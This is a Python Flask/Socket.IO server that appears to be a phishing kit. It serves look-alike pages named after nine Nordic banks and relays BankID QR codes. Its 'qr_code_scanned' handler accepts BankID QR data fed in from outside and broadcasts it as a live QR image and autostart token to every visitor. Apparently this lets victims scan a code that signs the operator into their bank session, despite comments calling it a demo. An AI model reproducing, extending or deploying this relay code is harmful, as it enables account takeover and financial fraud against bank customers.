from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO
import qrcode
import base64
from io import BytesIO
import hmac
import hashlib
import time
import uuid
import json
import os

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')

# Store QR tokens and secrets for the session
session_data = {}

@app.route('/')
def index():
    return render_template("index.html")


@app.route('/danske.html')
def danske():
    return render_template('danske.html')


@app.route('/handelsbanken.html')
def handelsbanken():
    return render_template('handelsbanken.html')


@app.route('/ica.html')
def ica():
    return render_template('ica.html')


@app.route('/lansforsakringar.html')
def lansforsakringar():
    return render_template('lansforsakringar.html')


@app.route('/nordea.html')
def nordea():
    return render_template('nordea.html')


@app.route('/seb.html')
def seb():
    return render_template('seb.html')


@app.route('/skandiabanken.html')
def skandiabanken():
    return render_template('skandiabanken.html')


@app.route('/sparbanken.html')
def sparbanken():
    return render_template('sparbanken.html')


@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')


@app.route('/generate_bankid_qr', methods=['POST'])
def generate_bankid_qr():
    """Generate a new BankID QR code with token and secret"""
    # In a real implementation, you would call BankID API here
    # For demo purposes, we'll generate a UUID as token
    session_id = request.form.get('session_id', str(uuid.uuid4()))
    
    # Create new QR data if it doesn't exist
    if session_id not in session_data:
        # Generate qrStartToken and qrStartSecret as specified in BankID docs
        qr_start_token = str(uuid.uuid4())
        qr_start_secret = str(uuid.uuid4())
        order_time = time.time()
        
        session_data[session_id] = {
            'qr_start_token': qr_start_token,
            'qr_start_secret': qr_start_secret,
            'order_time': order_time,
            'created_at': time.time()
        }
    
    # Get the existing QR data
    qr_data = session_data[session_id]
    
    # Generate the animated QR code based on time elapsed
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    # Generate QR code image
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    # Send the token (but not the secret) to the client for deep linking
    return json.dumps({
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_data['qr_start_token'],
        'session_id': session_id
    })


@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] QR code received: {qr_data}")
    
    # Check if we received a BankID token or a full BankID QR code
    if '.' in qr_data and qr_data.startswith('bankid.'):
        # Full BankID QR code format
        parts = qr_data.split('.')
        if len(parts) == 4:
            # This is a valid BankID QR code
            token = parts[1]  # Extract the token part
            print(f"[Debug] Extracted BankID token from QR data: {token}")
            
            # Create a QR code with this data
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            
            qr.add_data(qr_data)
            qr.make(fit=True)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            buffered = BytesIO()
            qr_img.save(buffered, format="PNG")
            img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
            
            # Emit the QR data and token separately for backward compatibility
            socketio.emit("update_qr_code_image", {
                'qr_image': img_base64,
                'qr_code_data': qr_data,
                'autostarttoken': token
            })
            
            # Also send the token for clients expecting it directly
            socketio.emit("bankid_token", {'token': token})
    else:
        # Assume it's just a token or other QR data
        # Store the QR data globally for fresh requests
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )

        qr.add_data(qr_data)
        qr.make(fit=True)
        qr_img = qr.make_image(fill_color="black", back_color="white")

        buffered = BytesIO()
        qr_img.save(buffered, format="PNG")
        img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

        # Send the QR data to the client
        socketio.emit("update_qr_code_image", {
            'qr_image': img_base64, 
            'qr_code_data': qr_data,
            'autostarttoken': qr_data  # Use QR data as token
        })
        
        # Also emit the bankid_token event for consistent handling
        socketio.emit("bankid_token", {'token': qr_data})


@socketio.on('request_qr_data')
def handle_request_qr_data():
    """Generate a new BankID QR code and emit it to the client"""
    session_id = str(uuid.uuid4())
    
    # Generate new QR data
    qr_start_token = str(uuid.uuid4())
    qr_start_secret = str(uuid.uuid4())
    order_time = time.time()
    
    session_data[session_id] = {
        'qr_start_token': qr_start_token,
        'qr_start_secret': qr_start_secret,
        'order_time': order_time,
        'created_at': time.time()
    }
    
    # Generate the QR code data
    qr_time = "0"  # Initial time is 0
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_start_secret.encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_start_token}.{qr_time}.{qr_auth_code}"
    
    # Generate and emit the QR code
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    # Send the QR image, data, token, and session_id to the client
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_start_token,
        'session_id': session_id
    })
    
    # Also send the token via qr_data event for backwards compatibility
    socketio.emit('qr_data', {'qrData': qr_start_token, 'session_id': session_id})
    
    # Return session data for session management
    return {'session_id': session_id, 'token': qr_start_token}


@socketio.on('request_fresh_qr_data')
def handle_fresh_qr_data_request():
    """Generate a fresh QR code and send it to the client"""
    # Always generate new data for security
    return handle_request_qr_data()


# Clean up old session data periodically
@socketio.on('connect')
def handle_connect():
    # Clean up sessions older than 10 minutes
    current_time = time.time()
    expired_sessions = []
    
    for session_id, data in session_data.items():
        if current_time - data['created_at'] > 600:  # 10 minutes
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        del session_data[session_id]


# Start animated QR code updates
@socketio.on('start_qr_animation')
def handle_start_qr_animation(data):
    """Generate an updated QR code based on elapsed time"""
    session_id = data.get('session_id')
    if not session_id or session_id not in session_data:
        # Generate new session if not provided or invalid
        return handle_request_qr_data()
    
    # Get the existing QR data
    qr_data = session_data[session_id]
    
    # Update the QR code with the current time
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    # Generate and emit the QR code
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    # Send the QR image and token to the client
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_data['qr_start_token'],
        'session_id': session_id
    })


# API endpoint to handle mobile app deep linking
@app.route('/api/bankid/start', methods=['POST'])
def start_bankid():
    """Start BankID authentication and return the autostart URL"""
    # In a real implementation, this would call the BankID API 
    # and include the returnUrl parameter in the API call
    
    data = request.json or {}
    # Get current URL as return URL or use the provided one
    return_url = data.get('returnUrl', request.referrer or request.url_root)
    
    # Create a nonce for session validation
    nonce = str(uuid.uuid4()).replace('-', '')[:16]
    
    # Generate a session ID
    session_id = str(uuid.uuid4())
    
    # Generate token and secret
    qr_start_token = str(uuid.uuid4())
    qr_start_secret = str(uuid.uuid4())
    
    # Store session data
    session_data[session_id] = {
        'qr_start_token': qr_start_token,
        'qr_start_secret': qr_start_secret,
        'order_time': time.time(),
        'created_at': time.time(),
        'return_url': return_url,
        'nonce': nonce
    }
    
    # Determine platform to provide appropriate URL
    platform = data.get('platform', 'unknown')
    
    response_data = {
        'session_id': session_id,
        'autostart_token': qr_start_token,
        'nonce': nonce
    }
    
    # Add appropriate autostart URL based on platform
    if platform == 'ios':
        response_data['autostart_url'] = f"https://app.bankid.com/?autostarttoken={qr_start_token}&redirect=null"
    elif platform == 'android':
        response_data['autostart_url'] = f"https://app.bankid.com/?autostarttoken={qr_start_token}&redirect=null"
    else:
        # Desktop format
        response_data['autostart_url'] = f"bankid:///?autostarttoken={qr_start_token}"
    
    return jsonify(response_data)


@app.route('/api/bankid/qrcode/<session_id>')
def get_qr_code_by_session(session_id):
    """Get QR code image by session ID"""
    if session_id not in session_data:
        return jsonify({'error': 'Session not found'}), 404
    
    qr_data = session_data[session_id]
    
    # Generate the animated QR code based on time elapsed
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    # Generate QR code image
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    return jsonify({
        'qr_image': img_base64,
        'qr_data': bankid_qr_data,
        'autostart_token': qr_data['qr_start_token']
    })


@app.route('/api/bankid/status/<session_id>')
def check_bankid_status(session_id):
    """Check the status of a BankID authentication session"""
    # In a real implementation, this would call the BankID API to check status
    if session_id not in session_data:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    # For demo purposes, just return pending status
    return jsonify({
        'status': 'pending',
        'message': 'Waiting for BankID authentication'
    })


if __name__ == "__main__":
    # socketio.run(app, host='0.0.0.0', port=5000, debug=True)  
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)